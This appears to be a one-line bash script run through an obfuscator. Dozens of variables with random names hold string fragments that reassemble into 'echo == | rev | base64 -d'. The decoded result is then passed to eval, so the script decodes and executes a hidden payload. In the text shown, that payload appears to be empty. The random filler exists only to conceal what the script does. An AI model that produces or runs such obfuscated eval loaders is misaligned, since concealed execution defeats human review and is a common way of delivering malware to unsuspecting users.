RzWpmtDapdnmJFZPIepYySApGKGhTZTAPzUtcWlVauJTYvmHgyREsLefyXSUPKaswkfJCIYXoNzIkLqfMMwlotuiyHEhoKSsnclG="huQqeuDSyyTnVhYuecMxdKsLQbCWBcWAUZfBtIXqbsfPXRtfeUUwxatYIHJzXMyiwOZxugumQMKKmRGWMfQdECdnpvykwNwMDOAq";YlSdCWhtwNMMXcwecQFgfoszFRxTGCzSArQIToinvHHviBFzaBFRlbtDiUijoYNpzkpqPGNiGRFgOrwROnOnTHNvVhdZLPsgGJcm="QxnopLUfMPDKBtEiSlbcysDiOnEEUoPHfwofnithNHeUICtdWFFePFdyKFAWXjQUMwrkNFTrNpYjUpsfgvKbWulVWEMOxjmrfEYq";MjdUKayLPSltJDcwWVfTUJRXQQUOqQseuxFzdKCrJceJIezknWhJNOcTXLGjIAYPFaxrgXuASbYerhvnhhWdEHjhTyqUyZvkBgfO="ch";DevziLbBWZFcJWIphggcVKIvrIXXCiGjDzVkWRblanuqiXXuUfiEQsQMYjkjMfAHjeTaxJlUribjuOTmFYTEWMYuheVjPSQmkAKU="4";SyZGcthqGdFgRTMODpkDlrrMSxwPkAMdZXoYkfbRNkPQjptDxFziIfhGefStWAZjKiguUlfRvEPjJjSXbRgAGeMkKpYtvivsKuYE="";cDgThNCZrxwthVkOrUraqMqKSXdNSedKrHZgGKESZLPGaWacEtULStXluycmdbKLfyTOPTtCzDllljCKxmnhrfUoRMktCJgXmLya="jbDtApdYxxCpjlYIPshVmjuEiNJAwWjIEhBgcSyWlqVvQFNktiJcWAzrOAOgNNQxhwTrcxXCgPLBRiyEXuIlEzcHNeqzSAxuarJs";YwxpdUMPnAbBElgBVPevKEdUrURtIKVXaStldPEIFVOxycfhUUVrtiaJLXrtZUEyBllASHYCDfdfXLLiqkXKLNwDuqMRKaFXzjjP=" == | r";fmPMZpiocoDJssOAbspmOtFWfozvTeZJpEGIPrrBWNpOuXvnFdYGcEudTFKlAYkUEJvdLVCzhaEBZucVnaCmIMkFfysBJvsKWlcS="jbrRQcQiCglmwZEyzEuejBQxJgQzfNFFYXdoNIZrDQhCoIrVuufAgDtBPfgkGeclFgLDoqhYitQYgBLeQMssQqDcznhmHjcLMpiA";NcncIqnvOENqIczWGfEuTDcdBxtlEmgDElsOGHttCmhcLqwxsEXllTGkRTajMPafolaVEabaWIferultVupCxvOkVqKvZkWfndiu="";RldZlqQaQPjYTTtRmkvpSgvlHrnIvJnVMeKLQHhzvXSqpQZYUymgTasjPGeSWDBoMyRcFEVReZyGziZAozyxThYeDJzCXmUhcBLK="as";PSrGnZWQgllCvnxxyiIDruzzttmtRlHEAajNIkrUaKlvKMXIzsoKpAHmzgQXPLqtajTXdXLLqtOHvDweTSFKCqNcBNuyihBZwhrd="iwWLttEXnlsOdPoqDqjwaWiYaofKNpHeYTUvvNtTRECHaoAUXjiwxckJTWwtnAvObdLoimgfSKBblLjbvybTaaaJtSmuznQYAnvK";KFxDzKzGXoaSbtKETWZpFqdFeQbqfCetSEJJzPixrdnyoNUnXHYeTdddHxmcLvDxPnGJlDhJLpwBJEiwmQbVOaPSayeiPGRicJkL="QZWWHjyeioHdrLtZcvbozmOjhfzvYvEbVoVzdHYxBpsNgYaCzkAKiRfItEyqWhdvclmzqLttQlXuGcEsLCGjgVdjjdzprLnmERLa";fyAWOqHZhDfnQAQafmWWXkvVWsNmNGfwmkrAOzFQaqkRJIOCVandpJvXMLxBvbSfnWbzluufMPrysFGRDvozkAquLBwCrKpYenOU="o";IeCwdeMwhLFfhbEzYCuiBUOSTpsPpbPTrLAtwsJpClHPHCpqADaFpLpSCqWxjTEHxFMircMbIPKHcalOsYaTpcuUYpBwvGOriJZW="6";IDEQUxlhJbsgBHdPttPKCIGyyDZJFSaeCpKNlcTnvZOceMiFcZOJyqeqNZdjPjbYuyDItGJoFjRJRfKLSEWTEzFJARImRAprCyXt="KoWbBiGgQHoZCvyJVcUSdoVgfWzVysnURufKzMVuJaycYSLVORiiEicjwqCtOlGSQTEAVWPKEFQnEgKNQggSFCjDgCdfMbsWwjKy";QfxRVeDHKUPZwYdXZtmzYinJZBkrlzrqejVCEieLnhRAFwWCSqWvtqwmOYbeeJmzkIohgfjxwVAJerKuTYUVJdjnsILbbDUoxqPD=" -d";VvkktwDsZAnfldeeAxnHDaRYcDSKancSmxgBSQVqGISkKJibXDxJLLALMozPnTScXYbaEsFApWsXjePcIZXLEDBsbwrUAEyNXIab="ilcTeOeCHwVZUmLipjPfnOoyXWULAvVhOrWsCSWiVBUeEArjJSGDRrfWRZAedVmFtCAMpkExgTaMEUuJYpVZZTzeUpnFEhWYXfki";HKDhvbITqMDMdgJuIFaSqwiymszbAyCKIhzGyqBmdhjGeQxBHbOaniQGcZdRbzEduvxjiLcwAOJGFcpULgMQEfvhhtBUYVkkFYvy="";adXxkcUXlFKwJhuvGTyjUsWQtTdKNqUUMuolblxbftYdWkEMaFlkaLieGgDgqHrhbwXTLVDPqBHVSdSWCdBNJpNQzoHDhGjBdGsw="b";ZuUkcvbeEmgJoUNksuOGlcyywaTsnACVbIdvAFlwyfvoNivkehkSeGvMscaHqyXPrgUdHlNifGUZHnnniAxRRtzQcgxgyprrAogt="e";WMPdnVQXIPPcGPlQIgiPvGMAInYiOpAQWUeoJSpwexeJFnIqIjTLzeqstRvhcyqdiSRjNeQPZffwWohqooNNOncqvaQlOrapeQaw="v |";Tx=Eds;BntocxojfCeQtVCuuZCUaUJCkBdREdnbySRzNoOtYEigIUlrJeHSzsnSTlqXnUCiijrqKXWquchMEAwEoVAQBssSBNUvKCGPSspi="";vIHUffNALxcNtlPcHEysAWmmpKiHcYpIKBGIWetWBBszFTZRRKZnlASZeLyuLJDOQqjliDwstzviACReswEbophrpfXiLEkUYFhQ=$(eval "$NcncIqnvOENqIczWGfEuTDcdBxtlEmgDElsOGHttCmhcLqwxsEXllTGkRTajMPafolaVEabaWIferultVupCxvOkVqKvZkWfndiu$ZuUkcvbeEmgJoUNksuOGlcyywaTsnACVbIdvAFlwyfvoNivkehkSeGvMscaHqyXPrgUdHlNifGUZHnnniAxRRtzQcgxgyprrAogt$MjdUKayLPSltJDcwWVfTUJRXQQUOqQseuxFzdKCrJceJIezknWhJNOcTXLGjIAYPFaxrgXuASbYerhvnhhWdEHjhTyqUyZvkBgfO$SyZGcthqGdFgRTMODpkDlrrMSxwPkAMdZXoYkfbRNkPQjptDxFziIfhGefStWAZjKiguUlfRvEPjJjSXbRgAGeMkKpYtvivsKuYE$fyAWOqHZhDfnQAQafmWWXkvVWsNmNGfwmkrAOzFQaqkRJIOCVandpJvXMLxBvbSfnWbzluufMPrysFGRDvozkAquLBwCrKpYenOU$YwxpdUMPnAbBElgBVPevKEdUrURtIKVXaStldPEIFVOxycfhUUVrtiaJLXrtZUEyBllASHYCDfdfXLLiqkXKLNwDuqMRKaFXzjjP$ZuUkcvbeEmgJoUNksuOGlcyywaTsnACVbIdvAFlwyfvoNivkehkSeGvMscaHqyXPrgUdHlNifGUZHnnniAxRRtzQcgxgyprrAogt$WMPdnVQXIPPcGPlQIgiPvGMAInYiOpAQWUeoJSpwexeJFnIqIjTLzeqstRvhcyqdiSRjNeQPZffwWohqooNNOncqvaQlOrapeQaw$NcncIqnvOENqIczWGfEuTDcdBxtlEmgDElsOGHttCmhcLqwxsEXllTGkRTajMPafolaVEabaWIferultVupCxvOkVqKvZkWfndiu$adXxkcUXlFKwJhuvGTyjUsWQtTdKNqUUMuolblxbftYdWkEMaFlkaLieGgDgqHrhbwXTLVDPqBHVSdSWCdBNJpNQzoHDhGjBdGsw$BntocxojfCeQtVCuuZCUaUJCkBdREdnbySRzNoOtYEigIUlrJeHSzsnSTlqXnUCiijrqKXWquchMEAwEoVAQBssSBNUvKCGPSspi$RldZlqQaQPjYTTtRmkvpSgvlHrnIvJnVMeKLQHhzvXSqpQZYUymgTasjPGeSWDBoMyRcFEVReZyGziZAozyxThYeDJzCXmUhcBLK$ZuUkcvbeEmgJoUNksuOGlcyywaTsnACVbIdvAFlwyfvoNivkehkSeGvMscaHqyXPrgUdHlNifGUZHnnniAxRRtzQcgxgyprrAogt$IeCwdeMwhLFfhbEzYCuiBUOSTpsPpbPTrLAtwsJpClHPHCpqADaFpLpSCqWxjTEHxFMircMbIPKHcalOsYaTpcuUYpBwvGOriJZW$SyZGcthqGdFgRTMODpkDlrrMSxwPkAMdZXoYkfbRNkPQjptDxFziIfhGefStWAZjKiguUlfRvEPjJjSXbRgAGeMkKpYtvivsKuYE$DevziLbBWZFcJWIphggcVKIvrIXXCiGjDzVkWRblanuqiXXuUfiEQsQMYjkjMfAHjeTaxJlUribjuOTmFYTEWMYuheVjPSQmkAKU$QfxRVeDHKUPZwYdXZtmzYinJZBkrlzrqejVCEieLnhRAFwWCSqWvtqwmOYbeeJmzkIohgfjxwVAJerKuTYUVJdjnsILbbDUoxqPD$BntocxojfCeQtVCuuZCUaUJCkBdREdnbySRzNoOtYEigIUlrJeHSzsnSTlqXnUCiijrqKXWquchMEAwEoVAQBssSBNUvKCGPSspi");eval "$HKDhvbITqMDMdgJuIFaSqwiymszbAyCKIhzGyqBmdhjGeQxBHbOaniQGcZdRbzEduvxjiLcwAOJGFcpULgMQEfvhhtBUYVkkFYvy$vIHUffNALxcNtlPcHEysAWmmpKiHcYpIKBGIWetWBBszFTZRRKZnlASZeLyuLJDOQqjliDwstzviACReswEbophrpfXiLEkUYFhQ$NcncIqnvOENqIczWGfEuTDcdBxtlEmgDElsOGHttCmhcLqwxsEXllTGkRTajMPafolaVEabaWIferultVupCxvOkVqKvZkWfndiu$SyZGcthqGdFgRTMODpkDlrrMSxwPkAMdZXoYkfbRNkPQjptDxFziIfhGefStWAZjKiguUlfRvEPjJjSXbRgAGeMkKpYtvivsKuYE"